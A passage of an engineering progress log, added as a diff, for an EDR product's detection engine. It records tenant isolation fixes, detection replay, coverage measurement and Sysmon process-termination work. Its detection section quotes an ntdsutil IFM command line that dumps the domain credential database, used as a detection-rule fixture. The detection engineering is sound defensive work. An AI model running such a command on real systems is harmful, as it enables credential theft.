+  test_contributor_contract_wiring (14, incl. the owner-required twin
+  collision regression), dt2/__tests__/compromise.test.js (28).
+- DT2-3c OPEN (owner review): (1) fixture has NO parent-process linkage so
+  PROCESS_PROCESS edges = 0 and the causal story cannot be drawn —
+  fixture gap, not a renderer gap; (2) compromise `observed_at` coincides
+  with its subject contributor by fixture construction; (3) the yellow IOC
+  geometry is a NIVXFORGE DESIGN DECISION, uncited against Cisco;
+  (4) `?from=/?to=` deep-link time focusing is NOT honoured; (5) the four
+  acceptance screenshots and the real-corpus DT2-3b regression pass are not
+  done. Diagnostic: memory/production-gates/DT2_3C_GEOMETRY_DIAGNOSTIC.md
+- FINDING: the endpoint resolver aliases on the physical computer name, so
+  an acceptance endpoint for `DESKTOP-A9HGFJJ` merged the historical (3,298)
+  and clean (3,299) corpora into one 6,597-row read. The projection is not
+  tenant-scoped. I removed that misleading endpoint row rather than ship a
+  merged view; the acceptance counts were proven directly from the store.
+
+---
+
+## 2026-09-29 · E1 EVIDENCE AUTHORITY = PASS · DT2 FROZEN · ENGINE-FIRST PROGRAM OPENED
+
+Owner directive received: **engine-first**. Device Trajectory is now a
+FROZEN consumer/projection. No cosmetic Cisco parity work until the
+engine foundation reaches its gates. Not deployed.
+
+### P0 · TRAJECTORY/EVIDENCE TENANT ISOLATION — CLOSED (was the blocker)
+- Root cause: `services/edr/endpoint_query.endpoint_predicate()` keyed
+  evidence reads on the ALIAS SET only, and `event.raw.computer` is not
+  unique. Two customers both enrolling `DESKTOP-A9HGFJJ` produced ONE
+  6,597-row read (3,298 + 3,299). Alias resolution was already
+  tenant-constrained; the downstream evidence query was not.
+- Fix: new `TENANT_PARTITIONED_STORES` (`v2_shadow_observations`,
+  `edr_raw_events`, `edr_endpoints`) + `tenant_id=` kwarg. Predicate is
+  now `{"$and":[{tenant}, {identity}]}` (the `$and` also stops a caller's
+  own `$or` clobbering it). A partitioned store with NO tenant returns
+  `_nivx_unresolved_tenant` — fail closed, never a cross-customer read
+  and never a false-honest empty. `EndpointResolution.predicate()` takes
+  the tenant from the AUTHORITATIVE resolved identity only, so an
+  identity whose ownership failed closed (TENANT_CONFLICT / MISMATCH /
+  UNATTRIBUTED_LEGACY) reads nothing.
+- Call sites scoped: trajectory_window (5), response.py, xdr_search,
+  edr_onboarding. Projection cache key now includes the tenant.
+- LIVE PROOF: unscoped 6,597 → tenant A 3,298 / tenant B 3,299 /
+  tenantless 0. Same hostname resolves to a DIFFERENT device per
+  customer. Cross-tenant device id → `ENDPOINT_NOT_RESOLVED` (opaque).
+- Tests: `tests/edr/test_trajectory_tenant_isolation.py` (32, A-K incl. a
+  structural guard that no query site may address a partitioned store
+  without a tenant). `test_p0_2c_alias_invariant.py` 2 cases retargeted
+  (intent preserved, one new fail-closed case added).
+
+### TWO FABRICATIONS REMOVED
+1. Navigator compromise markers came from the per-observation
+   `compromise_authority` classification: the clean corpus showed **70**
+   compromise events for an endpoint whose contract says
+   `NO_AUTHORITATIVE_COMPROMISE_OBSERVED`, while the fixture that holds a
+   real one showed 0. New `_mark_compromises()` reads ONLY the
+   contract-validated store. Marker and contract can no longer disagree.
+   Test: `test_dt2_3c_compromise_marker_authority.py` (8, A-H).
+2. `isRed()` painted red off a bare `is_detection` flag — 480/500
+   historical rows are `kind=detection` + `UNKNOWN_NOT_ASSESSED`, so
+   ordinary Sysmon telemetry rendered malicious. Now requires
+   `ASSESSED_BY_DETECTION_FABRIC` or a MALICIOUS disposition. The red
+   ATT&CK box is neutral when nothing is attributed.
+
+### DT2-3c REV 2 (owner corrections, then FROZEN)
+- Full-height yellow IOC column **REMOVED from strict parity** (it was an
+  uncited NivXForge decision). Compromise is now a SEPARATE EVENT on its
+  own `Compromise` band with a red marker, so it stays distinguishable
+  from its contributors at the same instant — no timestamp altered.
+- Surface switched to **DARK** (the owner's live Cisco console captures
+  outrank the light User-Guide figure). Light palette retained.
+- `?from=&to=` time focusing now HONOURED on first paint (proved exactly
+  120,000 ms); auto-focus never overrides an explicit window.
+- Fixture now AUTHORS parent-process evidence ⇒ explorer.exe →
+  powershell.exe → updater.exe exists in evidence, drawn with
+  `SYSMON_PARENT_PROCESS_GUID`, AUTHORITATIVE.
+- Projection was DROPPING `parent_guid`/`parent_image`/`process_guid`;
+  propagating them gave the REAL corpus 10 PROCESS_PROCESS + 7
+  PROCESS_NETWORK + 1 PROCESS_DNS edges it had never shown.
+- `LANE_PREFETCH` 14 → 90 (one row consumes many projection lanes), so a
+  dense endpoint renders 28 rows instead of 8. Nothing fabricated.
+- Search reports a match count ("9 matching observations") and reduces
+  the axis; blue search dots in both ribbons.
+- Tests: frontend vitest **204 passed** (new `dt2_3c_rev2_parity.test.js`,
+  15). Focused backend DT2 regression **182 passed**.
+
+### THE MATURITY GAP — DIAGNOSED
+`docs/NIVXFORGE_EDR_ENGINE_MASTER_BLUEPRINT.md` (WAVE 0 inventory).
+Headline: both acceptance corpora have **ZERO `edr_raw_events`** — they
+were written straight into `v2_shadow_observations` by re-projection
+scripts, bypassing ingestion and therefore the detection fabric. No raw
+row ⇒ no derivations ⇒ no DETECTION_MATCHED ⇒ no ATT&CK / IOC /
+compromise. The fabric WORKS (1,456 DETECTION_MATCHED platform-wide) and
+`detection_content/library/registry.py` already holds **37 rules, 23
+Windows, all ATT&CK-mapped**, including DET-PS-001 / T1547.001 — the
+exact Run-key persistence the fixture hand-authored. E3 content is
+present; E3 EXECUTION on the acceptance corpora is absent.
+
+### ENGINE MATRIX (blueprint §1)
+E1 PASS · E2 PARTIAL · E3 CONTENT PRESENT / NOT EXECUTED · E4 STUB ·
+E5 PRIMITIVES ONLY · E6 PARTIAL · E7 CONTRACT COMPLETE, NO PRODUCER ·
+E8 ABSENT · E9 COMPLETE+HARDENED · E10 STUB.
+Duplicates to reconcile (not fork): `services/mitigation/evidence_driven/
+rule_library.py` vs `detection_content/library/registry.py`;
+`services/behavioral/sysmon_adapter.py` vs `edr_plane/windows_eventlog.py`.
+
+### NEXT (awaiting owner authorisation)
+WAVE 2 · E2 Process/Entity Graph — PID-reuse-safe identity, Sysmon 5
+termination, SERVICE/TASK/MODULE entities, store GUIDs at ingest.
+Then WAVE 3 · E3 — **P0: an evaluation path over EXISTING canonical
+observations**, without which every re-projected corpus is permanently
+undetectable.
+
+### ACCEPTANCE IDENTITIES
+- clean real Windows corpus: `dev_f4b3fb82d7f3` / tenant
+  `ten_3f7f772b353a6bbbb0ac8bc564` (3,299)
+- contaminated historical corpus (UNTOUCHED, audit): `dev_2adbb41a04a4` /
+  `ten_f1a5479243e901cf159e230fa0` (3,298, 3,102 `kind=detection`)
+- deterministic IOC fixture: `ep_dt23cfixture01` / `ten_61377adfb36187a579ce44574b`
+
+### PRE-EXISTING failures (NOT caused by this work, proven by stash)
+`test_p0_a2_adversarial_live` (1), `test_p0_f13_5_detection_handoff` (5),
+`test_p0_f7_live_api` (9 errors — live preview 504 on
+`/api/edr/campaign-story`), `test_iteration_82_activation` (fails 7 at
+HEAD vs 2 with the patch; the legacy golden corpus is absent from this
+preview DB).
+
+---
+
+## 2026-09-29 (later) · WAVE 3 / E3 · DETECTION REPLAY IMPLEMENTED
+
+Owner directive: engine-first, Detection Replay FIRST, and it must invoke
+the canonical fabric rather than become a second detection engine.
+Not deployed.
+
+### THE DIAGNOSIS WAS CORRECTED BY MEASUREMENT
+My earlier "the corpus bypassed detection" was too crude. Measured:
+- `xdr_canonical_evidence` holds **3,299 fully normalised rows** for
+  DESKTOP-A9HGFJJ (with Sysmon `process_guid` + field provenance). It
+  arrived via `POST /api/xdr/ingest/telemetry`, so `edr_raw_events` is 0.
+- `xdr_detection_matches` / `edr_findings` / `edr_finding_evaluations`
+  were **0 / 0 / 0**.
+- Running `evaluate_detection()` over all 3,299: **3,299 ×
+  `RULE_NO_MATCH`, zero errors.**
+- POSITIVE CONTROL proves the rules DO bind to the canonical dialect:
+  encoded PowerShell → DET-EX-001/T1059.001; regsvr32 →
+  DET-EX-005/T1218.010; Run key → DET-PS-001/T1547.001; WMI →
+  DET-EX-004/T1047. Two did NOT fire → real content gaps: IEX
+  download-execute (T1105) and LSASS credential access (T1003).
+- The real corpus is **genuinely benign**: 2,615/3,299 svchost.exe, only
+  **16 rows carry any command line**, **0 interpreter/LOLBin processes**.
+  CORRECTED (owner ruling): we may NOT claim Cisco would report the same.
+  The defensible statement is that NivXForge's currently available
+  telemetry and currently implemented rules produced no detections for
+  this corpus. `RULE_NO_MATCH` is not a verdict of "clean".
+
+So the actual defect was OUR negative-explainability invariant: nothing
+recorded that the evidence HAD been evaluated, so no surface could tell
+"evaluated, nothing matched" from "nobody has looked yet", and silence
+read as benign.
+
+### DELIVERED
+- `edr_plane/detection_replay.py` + route
+  `POST /api/edr/endpoints/{id}/detection-replay?apply=false`.
+  - verdict from `detection_content.xdr_pipeline.evaluate_detection` —
+    the IDENTICAL function live ingest calls; durability from
+    `record_endpoint_detection` — the IDENTICAL function live ingest
+    calls. Replay defines NO rule, predicate, threshold or match shape,
+    enforced by a structural test. Live and replay cannot diverge.
+  - enters at the DETECTION stage over already-canonical evidence, so it
+    cannot re-run DSM/parser/normalizer or mint a duplicate canonical
+    row; writes no `edr_raw_events` (that would claim sensor bytes we
+    never received); `apply=false` is the default.
+  - `xdr_canonical_evidence` is now a DECLARED tenant-partitioned
+    endpoint-keyed store, so E1 governs the read.
+  - TIME MODEL (the E8 contract, established here): `observed_at` = the
+    endpoint instant, NEVER touched; `derived_at` = when the verdict ran.
+- RESULTS: real corpus 3,299 evaluated / 0 matched (honest);
+  fixture 6 evaluated / **4 matched** (DET-EX-001 ×4, DET-PS-001 ×2);
+  same hostname other tenant → 0; no tenant → `TENANT_NOT_RESOLVED_FOR_REPLAY`.
+- READ PATH: `assessment_state` now carries three distinct facts —
+  `ASSESSED_BY_DETECTION_FABRIC` / `EVALUATED_NO_DETECTION` /
+  `NOT_EVALUATED` (+ SUPPRESSED, EVALUATION_FAILED), each with a stated
+  `evaluation_meaning`. `NO_DETECTION_CLAIMED_THIS_OBSERVATION` RETIRED
+  (it read as "evaluated and nothing claimed it").
+  New joins: `edr_finding_evaluations` + `edr_findings` by
+  `canonical_event_id`, so a finding supplies rule id, version, severity
+  and ATT&CK. `record_endpoint_detection` gained an optional
+  `citations=` so the producing rule's OWN severity/ATT&CK survive
+  instead of becoming `NOT_RECORDED_BY_SOURCE`.
+- E6 BOUNDARY: `mitre_basis` = `RULE_DECLARED_BY_MATCHED_DETECTION` vs
+  `SOURCE_NORMALIZER_TAG_NOT_VALIDATED_DETECTION` vs `NOT_ATTRIBUTED`.
+  A technique is a claim ONLY when the matched rule declared it.
+- ACTIVITY DETAILS: new finding block (rule, version, severity, ATT&CK,
+  engine, evaluated-at, finding id, basis); "Evaluated · no rule
+  matched" vs "Not evaluated" are now different screens. The
+  self-contradicting "Not evaluated" on a matched event is fixed.
+- FIXTURE DEPENDENCY REVERSED: `scripts/dt2_3c_ioc_fixture.py` authors
+  TELEMETRY only (canonical evidence, command lines, parentage). It no
+  longer writes a detection derivation or a technique list. The engine
+  produces the detection; the compromise is built from THAT finding —
+  techniques from the matched rules, contributors = the exact
+  observations those rules cited (4 proven, no proximity inference).
+
+### TESTS
+`tests/edr/test_e3_detection_replay.py` (22) ·
+`dt2/__tests__/e3_detection_surface.test.js` (14) ·
+`test_p0_detection_attribution.py` retargeted for the retired token +
+a new three-state case. Frontend vitest **218 passed**; focused backend
+DT2/E1/E3 **211 passed**; full `tests/edr` 1,469 passed / 8 failed, all
+8 pre-existing (f7 flaky-live, a2 ×1, f13_5 ×5 — proven by stash).
+
+### KNOWN GAPS (honest, recorded, NOT worked around)
+- **SENSOR STARVATION — biggest limiter.** 16/3,299 real rows carry a
+  command line, so content rules have almost nothing to read.
+- 2 proven rule-content gaps: T1105 download-execute, T1003 credential
+  access.
+- `scripts/g1_clean_reprojection.py` wrote only the CEM shadow store, so
+  the clean corpus `dev_f4b3fb82d7f3` has NO canonical evidence and
+  replay honestly evaluates 0 there.
+- ATT&CK Tactics still read "Not attributed": rules declare technique
+  ids but a tactic NAME, not a TA id. No mapping was invented.
+
+### NEXT (owner review gate)
+WAVE 2 · E2 Process Identity — ProcessGuid-first identity, PID reuse,
+parent/child continuity, Sysmon 5 termination, explicit UNKNOWN when
+termination is not observed. Then E4 hashing/reputation, then E8
+retrospection (its time model is already in place).
+
+---
+
+## 2026-09-29 (WAVE A) · TELEMETRY TRACE + COVERAGE MATRIX + 1 REAL RULE FIX
+
+Owner-approved order: A widen/audit Windows process telemetry ·
+B converge the normalizers · C one canonical vocabulary · plus build the
+coverage matrix NOW from code+data. Not deployed. No endpoint touched.
+
+### A · TRACED, NOT ASSUMED → `docs/WAVE_A_WINDOWS_TELEMETRY_TRACE_AND_RUNBOOK.md`
+PROVEN: the collector applies **no event-ID filter** (`filters` empty in
+all 4 profiles); **0 Sysmon deliveries were refused**; **24 Security + 1
+System were BLOCKED** with `SOURCE_FORMAT_MISMATCH` /
+`content_recognized_as: []` — which is why `Security:4688` is absent;
+and the DSM is **not** the defect (a well-formed 4688 in the collector's
+own `{channel,xml}` envelope passes `recognizes_format()` and
+`supports()`).
+
+**THE REAL P0 DEFECT (fixed): the refusal could not explain itself.**
+`xdr_ingest.py` read only `raw["line"]`/`["message"]` for the excerpt,
+but the Windows collector sends `{channel, xml}` — so **55
+SOURCE_FORMAT_MISMATCH blocks across 4 tenants were written with an
+empty excerpt**. New `_excerpt_evidence()` walks a declared ordered list
+of content keys and records `payload_excerpt_source`, `_len`,
+`_truncated` and, when nothing carried text, an explicit
+`payload_excerpt_absent_reason` listing the keys that DID have a value —
+so "empty payload" and "unread payload" are now different facts.
+I do NOT claim why those 24 records were unrecognisable: that evidence
+was never captured. It is diagnosable on the next occurrence.
+Sysmon Event ID 1 = 16 for the window; nothing was lost at the collector
+or at ingest, so the cause is upstream and **NOT PROVEN** — the runbook
+asks for the endpoint's active Sysmon config and the channel's own
+Event ID 1 count before ANY config change.
+
+### COVERAGE MATRIX → `docs/E3_DETECTION_COVERAGE_MATRIX.md` + `.json`
+`backend/scripts/e3_coverage_matrix.py`, every cell measured from the
+rule registry + canonical schema + the rules' own fixtures + the REAL
+corpus. Columns: technique · rule · required telemetry · canonical
+event types/fields (via an explicit Sigma↔canonical vocabulary bridge) ·
+sensor can observe · actually collected · canonical field populated ·
+positive control in the FIXTURE dialect · positive control in the
+CANONICAL dialect · negative control · real-corpus evaluated · verdict.
+
+**Result: 22 SUPPORTED · 14 NOT_APPLICABLE · 1 PARTIAL · 0 UNSUPPORTED ·
+0 dead rules.** Deliberately NOT an ATT&CK percentage.
+It answers the owner's question directly — credential access: DET-CR-001
+(LSASS) and DET-CR-002 (NTDS) SUPPORTED; DET-CR-004/005/006 are
+identity-plane and out of scope for a Windows endpoint sensor.
+Remaining PARTIAL: DET-LM-001 T1021.002 — fires on canonical evidence
+but `registry.service_name` is never populated (service-creation
+telemetry is not collected).
+
+### THE ONE REAL DEFECT THE MATRIX FOUND (fixed)
+`DET-CR-002` T1003.003 gated on the literal string `ntds.dit`, so it
+could not fire on its OWN positive fixture: `ntdsutil "ac i ntds" "ifm"
+"create full <dir>"` never names the file. That is a real evasion gap.
+Predicate now also fires on the IFM instruction and on a shadow copy of
+the NTDS volume, and still does not fire on `dir C:\Windows\NTDS` or
+`ntdsutil /?`.
+
+### REGRESSION → `tests/edr/test_e3_coverage_invariants.py` (116 tests)
+Locks four invariants per rule: every rule satisfies its OWN fixtures ·
+a rule that fires on the raw dialect MUST fire on the canonical dialect
+(the dead-rule guard) · no rule fires on benign svchost/explorer/
+taskhostw telemetry in either dialect · every declared telemetry
+requirement is either mapped to a canonical field or declared
+out-of-scope. Also caught an undeclared `hypervisor` platform.
+
+### RETRACTIONS (measurement corrected me — all recorded in the runbook)
+1. "Cisco would also show no detections" — WITHDRAWN, not establishable.
+2. "0 file SHA-256 in the corpus" — WRONG; all 16 process_create rows
+   carry MD5 + SHA-256 with `sysmon:EventData.Hashes` provenance.
+3. "16/3,299 carry a command line ⇒ fields dropped" — WRONG; 16 is the
+   process_create COUNT and 16/16 carry one.
+4. "a dialect mismatch kills a rule" — WITHDRAWN; no rule compares
+   `event_type` to `process_creation`.
+5. "9 rules dead on canonical evidence" — WRONG, my own generator
+   artefact (it overwrote already-canonical fixtures). Now 0.
+
+### TESTS
+`tests/edr` + `test_d12_cross_dsm_activity_time.py`: **1,659 passed /
+7 failed**, all 7 pre-existing (f7 flaky-live ×1, a2 ×1, f13_5 ×5,
+proven by stash). Frontend vitest 218 passed.
+
+### ENGINE ASSESSMENT (blueprint §9, owner-required form)
+E1 PASS · E2 PARTIAL · E3 FRAMEWORK OPERATIONAL / CONTENT INCOMPLETE /
+REAL CORPUS EVALUATED NO MATCHES · E4 PARTIAL FOUNDATION (process-image
+SHA-256 exists; file-create hashes + reputation missing) · E5 PARTIAL,
+NOT OPERATIONALLY WIRED · E6 PARTIAL (techniques yes, tactic ids no) ·
+E7 contract exists, real production incomplete · E8 ABSENT ·
+E9 COMPLETE+HARDENED, not fed · E10 STUB.
+
+### NEXT (awaiting owner)
+B · converge the normalizers: `v2_shadow_observations` keeps only
+name/image/iid/parent and drops the GUID, command line and hashes that
+`xdr_canonical_evidence` already holds — the trajectory reads the poorer
+store. Target: one canonical contract, the CEM store becomes a
+non-lossy projection. Then E2 process identity, then E4 file identity +
+reputation adapter.
+
+---
+
+## WAVE B · FOUNDATION (B1→B4) — 2026-06 · OWNER REVIEW PENDING
+
+Full report: `docs/WAVE_B_FOUNDATION_REPORT.md`
+Measured evidence: `docs/WAVE_B_FOUNDATION_MEASUREMENT.json`
+(regenerate: `python3 backend/scripts/wave_b_foundation_measure.py`, read-only)
+
+Scope honoured: Device Trajectory FROZEN · no deployment · no data
+migration · no fabricated telemetry/hash/reputation/termination/causality
+· no Cisco-parity claim · coverage matrix unchanged (0 rule rows moved).
+
+### B1 · NORMALIZER CONVERGENCE — ACCEPTED
+`xdr_canonical_evidence` is the authority; `v2_shadow_observations` is a
+derived projection through ONE function (`observation_doc` →
+`ces_to_cem_dict`). Eight real losses/divergences found and fixed:
+`process_guid`+`parent_process_guid` (discarded after deriving an iid),
+`original_file_name`, `parent_command_line`, full `parent_image` path,
+`parent_pid` (DSM dialect's `ppid` was never read → parent PID lost for
+EVERY DSM-normalised Sysmon event), `field_provenance` (dropped
+wholesale), hash CASE divergence between the two dialects (IOC lookups
+matched on one path, missed on the other), and provenance coverage
+divergence. `raw.sha256` (the observation's own content digest) is now
+also exposed as `raw.content_digest_sha256` so it cannot be misread as a
+file hash. Measured: `B1_fields_still_lost = {}` over 3,299 observations.
+Regression: `tests/edr/test_b1_normalizer_convergence.py` (51).
+
+### B2 · PROCESS IDENTITY — ACCEPTED (limits stated)
+`backend/edr_plane/process_identity.py`. Authority ladder
+SOURCE_PROCESS_GUID → ENDPOINT_PID_START_TIME → PID_ONLY (NO key minted)
+→ NOT_OBSERVED. Tenant + endpoint are identity boundaries. Parentage is
+source-stated only (GUID resolves; parent-PID-only is described, never
+joined); nothing inferred from time/name/adjacency. Lifetime:
+START_OBSERVED / TERMINATION_OBSERVED / OBSERVED_EVIDENCE_SPAN /
+PROCESS_LIFETIME_UNKNOWN — `last_seen` is never an exit. Windows 4689
+was MISSING from `WINSEC_KIND` (a collected termination resolved to
+`unclassified_telemetry`); now mapped to `process_exit`.
+Measured: 54 processes, 54/54 by ProcessGuid, 16 parent edges all by
+ParentProcessGuid, 4 unattributed, 0 PID-reuse cases (63-minute corpus),
+54/54 `PROCESS_LIFETIME_UNKNOWN` because Sysmon EID 5 is NOT collected.
+Regression: `tests/edr/test_b2_process_identity.py` (20).
+
+### B3 · FILE IDENTITY — ACCEPTED as measurement + contract
+`backend/edr_plane/file_identity.py`.
+PROCESS_IMAGE_HASH != FILE_CREATE_HASH != FILE_CONTENT_IDENTITY.
+Process-image SHA-256 was NOT missing and was NOT rebuilt: 16/16
+`process_create` carry MD5+SHA-256 with provenance, now proven to survive
+projection. FILE-create content identity: **0 of 107** — Sysmon EID 11
+states path + writer + time, no hash, no size ⇒ `HASH_NOT_OBSERVED`,
+`PATH_IDENTITY_ONLY`. The writer's image hash is never promoted to the
+file. Identity ladder CONTENT_IDENTITY_SHA256 → non-SHA256-only →
+PATH_IDENTITY_ONLY. Sensor-side hashing DESIGNED ONLY (not implemented,
+no endpoint change): `docs/B3_SENSOR_SIDE_FILE_HASHING_DESIGN.md`, with
+10 acquisition outcome states, TOCTOU/`content_version_state`,
+rename/delete/repeat-write semantics, cache key
+`(volume_guid,file_id,size,mtime)`, perf/privacy limits and **6 owner
+decisions required before any code**. Regression:
+`tests/edr/test_b3_file_identity.py` (13).
+
+### B4 · REPUTATION FOUNDATION — ACCEPTED
+`backend/edr_plane/reputation/` — provider-neutral adapter
+(`ReputationProvider` Protocol), observable extraction that keeps the
+SUBJECT (PROCESS_IMAGE / FILE_CONTENT / NETWORK_PEER / DNS_QUESTION /
+URL_RESOURCE), verdicts KNOWN_MALICIOUS / KNOWN_GOOD / UNKNOWN /
+LOOKUP_FAILED / NOT_SUPPORTED (UNKNOWN != benign, LOOKUP_FAILED !=
+UNKNOWN, both enforced in code), aggregation states that are NOT
+verdicts, disagreement retained, tenant-scoped cache with explicit
+freshness and provenance, failures never cached. ONE provider
+implemented — `LocalIOCProvider`, offline, reading the EXISTING `iocs`
+authority, with positive AND negative controls. No secrets, no network,
+no third-party dependency in the core path. Regression:
+`tests/edr/test_b4_reputation.py` (18).
+
+### TESTS
+`pytest backend/tests/edr` → **1,697 passed / 3 failed / 3 skipped**
+(baseline 1,587 / 7 failed). New Wave B tests: 102, all green.
+5 of the 7 pre-existing failures were OBSOLETE-CONTRACT tests (fixed in
+the tests, with OLD/WHY-WRONG/NEW/EVIDENCE recorded in-file; production
+authorisation logic untouched). 1 was a live-edge 504 flake. The 2 still
+failing are PRE-EXISTING and were reproduced at HEAD with all Wave B
+source files stashed.
+
+### OPEN / NEXT
+1. **Owner-run Windows PRE-check** (READ-ONLY):
+   `docs/WAVE_B_WINDOWS_PRECHECK_READONLY.ps1` on DESKTOP-A9HGFJJ. Closes
+   the Sysmon EID 1 = 16 question and whether 4688/4689 exist locally.
+   No endpoint-changing action until its output is reviewed.
+2. **P0** Process TERMINATION telemetry is not collected (Sysmon 5 /
+   Security 4689 absent) ⇒ every process is honestly UNKNOWN-lifetime.
+3. **P0** File CONTENT identity unavailable for created files (0/107) —
+   blocked on the 6 B3 hashing decisions.
+4. **P1** EDR read-path performance: `device_identity.list_devices()`
+   full-scans `v2_shadow_observations` (262,823 docs) per call;
+   `/api/edr/device-trajectory` 14.3 s, `/api/edr/campaign-story` 11.2 s.
+   Causes the 2 remaining live-test failures. NOT fixed in this wave
+   (frozen surface, deserves its own measured change).
+5. **P1** `windows-security-evd` DSM refusal (Wave A) — still unproven
+   root cause; the ingest refusal logger fix means the NEXT occurrence is
+   diagnosable.
+6. Then: B5 read-only measurement surfaces, then the Cisco/Defender/
+   CrowdStrike/SentinelOne/Sophos/Carbon Black capability study BEFORE
+   finalising E4/E5.
+
+---
+
+## WINDOWS PRE-CHECK ASSESSMENT — 2026-06 · OWNER REVIEW PENDING
+Full report: `docs/WAVE_B_WINDOWS_PRECHECK_ASSESSMENT.md`
+Endpoint untouched · nothing deployed · trajectory frozen · no hashing implemented.
+
+**HISTORICAL EID 1 = `NO_LONGER_PROVABLE_FROM_ENDPOINT_RETENTION`.** The
+Sysmon channel is circular and its oldest retained record is
+2026-09-29T09:27:09Z, so the 2026-09-22 15:43–16:46 UTC window has rolled
+out (along with the EID 16 config-change records). 16 is the number that
+REACHED canonical evidence — no longer provable as the number generated.
+Replacement: a forward-looking read-only measured window (endpoint EID 1
+count vs backend `process_create` count over the same UTC minutes).
+
+**CURRENT EID 1 = HEALTHY.** Sysmon 15.22, ProcessCreate unfiltered,
+MD5+SHA256, full identity field set present — exactly what B1/B2 need.
+
+**EID 5 ROOT CAUSE = THREE independent blocks, all confirmed in-repo:**
+(1) NOT GENERATED — our own `nivx-w1-sysmon.xml` has
+`<ProcessTerminate onmatch="include"/>` with no rules (include-nothing);
+(2) would be REFUSED — no `("sysmon", 5)` in `SUPPORTED`
+(`edr_plane/windows_eventlog.py`) ⇒ `WINDOWS_EVENT_ID_NOT_SUPPORTED`;
+(3) would NOT be canonicalised — no `5` in the `sysmon_dsm.py` kind map.
+4689 is server-ready (B2 added it) but Windows auditing is No Auditing.
+**Proposal: SERVER FIRST (B5a, two dict entries + gate + regression),
+THEN one line on the endpoint (`include`→`exclude`, no service restart,
+owner authorisation required).** ~0.5% telemetry increase. Do NOT use
+4689 as the termination source: no ProcessGuid ⇒ PID-only guess.
+
+**FILE HASHING.** `PROCESS_IMAGE_SHA256` proven and preserved (16/16).
+`FILE_CREATE_CONTENT_SHA256` = 0/107 (`HASH_NOT_OBSERVED`); EID 15 is
+also off. The six B3 owner decisions are now answered with
+DECISION/OPTIONS/SECURITY/PERFORMANCE/RECOMMENDED/WHY. Recommended:
+acceptance endpoint only · allow-list by type · privacy trees excluded ·
+64 MiB & 120 files/min · 2 s settle window · retain `CHANGED_SINCE_EVENT`
+labelled. NOT IMPLEMENTED.
+
+**READ-PATH PERF ROOT CAUSE (measured, read-only).**
+`v2_shadow_observations` = 264,241 docs / **606 MB** / 2,417 B avg, and
+**TWO unfiltered full reads** in the path:
+`device_identity.py:195` (`list_devices`) and `:446` (`observations`,
+which filters in PYTHON). 4.45 s each ⇒ the 14.3 s trajectory request.
+The serving indexes already exist and are unused. Measured fix:
+indexed `$or` + `$gte` in `observations()` = 6,597 docs in **0.143 s**
+(31×, docsExamined == nReturned), unresolved device 0.001 s vs 4.45 s;
+`list_devices()` as a server-side `$group` = 63 rows in 0.47 s (9×) with
+the cross-tenant fail-closed invariant preserved literally. NOT
+IMPLEMENTED — awaiting authorisation.
+
+**NEXT (proposed):** B5a termination readiness (server only) · B5b
+read-path fix · B5c measured delivery-fidelity window · then the
+Cisco/Defender/CrowdStrike/SentinelOne/Sophos/Carbon Black study.
+
+---
+
+## B5 · SERVER-SIDE READINESS — 2026-06 · OWNER REVIEW PENDING
+Full report: `docs/B5_SERVER_READINESS_REPORT.md`
+Endpoint UNCHANGED · Sysmon XML UNCHANGED · not restarted · auditing
+UNCHANGED · 4688/4689 NOT enabled · NOT deployed · endpoint hashing NOT
+implemented · trajectory presentation UNCHANGED.
+
+**B5-1 EID 5 READINESS — DONE.** `("sysmon", 5) →
+ACTIVITY_PROCESS_TERMINATION` in `edr_plane/windows_eventlog.py` (its own
+branch: the PROCESS branch reads `UtcTime` as the START time, which on
+EID 5 is the EXIT instant — reusing it would have fabricated a start
+time) and `5 → process_exit` in `sysmon_dsm.py`. CEM kind resolution
+already had it. Preserved: ProcessGuid, PID, Image, `exit_time` (+
+`sysmon:UtcTime (EventID 5)` provenance), User. Declared absent:
+CommandLine, Hashes, Parent*, `process.start_time`. Declared
+unsupportable: `process.exit_code`. Exit binds to the SAME `process_key`
+as the creation via ProcessGuid; an exit with no authoritative identity
+mints no key and terminates NOTHING.
+**DECLARED DEVIATION:** kind is `process_exit`, not `process_terminate` —
+`process_exit` is already the CEM enum value, `SYSMON_KIND[5]`, the
+reviewed gate value and what `trajectory_window`/`campaign_story`
+consume. A second name for one fact is the B1 problem. Rename available
+as its own governed change if the owner wants it.
+**Convergence fix:** the sensor plane stated only the activity CLASS and
+no `event_type`; it now states `event_type` from the SAME vocabulary as
+the XDR plane.
+Regression: `tests/edr/test_b5_process_termination.py` (18) — positive,
+negative, malformed, replay/idempotency, cross-tenant, PID-reuse.
+
+**B5-2 READ PATH — DONE, semantics proven identical.**
+`observations()` now asks the DB which observations address the endpoint
+(indexes already existed and were unused); needles come from the STORE
+via indexed `distinct` filtered case-insensitively, and `_addresses()`
+REMAINS the admissibility authority. Directory read projected to the
+fields it consumes. Measured (`scripts/b5_read_path_proof.py`):
+directory-wide 298,006 ms → **23,196 ms (12.8×)**; busiest device
+index-only (256,418 examined / 256,418 returned, 387 ms); unresolved
+endpoint 4,450 ms → **167 ms**; `/api/edr/device-trajectory` **14.3 s →
+3.5 s**. Equivalence: **61/62 devices identical count + digest**; the one
+difference was live-write drift on the continuously-ingesting device
+(PRE == POST == 256,434 in the quiet rounds). Unchanged: tenant
+isolation, endpoint authority, opaque cross-tenant refusal, observation
+identity, time semantics, evidence content, response shape.
+
+**B5-3 FILE HASHING — CONTRACT ONLY.**
+`docs/B5_FILE_HASHING_SENSOR_CONTRACT.md`: state machine
+(FILE_CREATE → eligibility → settle → identity revalidation → hash →
+SHA-256+provenance OR explicit failure), 14 terminal states, additive
+`file.content_acquisition` block, all nine owner-listed cases.
+`PROCESS_IMAGE_SHA256` ≠ `FILE_CONTENT_SHA256` enforced. NOT IMPLEMENTED.
+
+**B5-4 DELIVERY FIDELITY — PREPARED, NOT EXECUTED.**
+`docs/B5_DELIVERY_FIDELITY_TEST_PLAN.md`: five separately-counted
+boundaries (generated → observed → sent → accepted/refused →
+canonicalized) per Event ID over one agreed 60-minute UTC window, with a
+retention guard, config-stability check and dedupe counted separately
+from refusal.
+
+**TESTS: 1,757 passed / 0 failed** (tests/edr + ingestion_phase4 +
+w1_sysmon_field_preservation). The two live-API tests that previously
+timed out now PASS because the read path is fast — closed honestly, not
+by weakening a test. Two PRE-EXISTING failures remain in
+`tests/test_v2_framework.py` (adapter flag default; v2/engine isolation
+walk), reproduced at HEAD with all B5 files stashed.
+
+**OPEN:** (1) accept `process_exit` or authorise the rename; (2)
+authorise the one-line Sysmon `ProcessTerminate` change (server is
+ready); (3) `campaign-story` still 11 s — NOT the directory scan, cost
